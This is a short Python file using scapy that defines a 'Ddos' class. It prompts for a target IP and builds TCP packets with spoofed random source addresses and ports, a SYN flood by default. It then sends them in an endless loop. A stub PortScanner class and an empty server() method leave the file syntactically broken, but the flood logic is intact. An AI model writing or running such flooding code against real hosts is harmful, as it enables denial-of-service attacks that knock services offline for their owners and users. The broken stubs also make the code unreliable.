from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP, send
from threading import Thread
import socket

class PortScanner:
    def __init__(self):
        pass

class Ddos:
    def __init__(self):
        self.ip = input("\n\n   [*]Enter target ip: ")
        flags = input("\n\n   [*]Enter flags(Syn flood by default): ")
        self.packet = IP(dst=self.ip, src=RandIP())/TCP(flags=flags, dport=RandShort(), sport=RandShort())
        print("[*]packet has been initialized")

    def server(self):

    def dos(self):
        send(self.packet, loop=1, verbose=1)
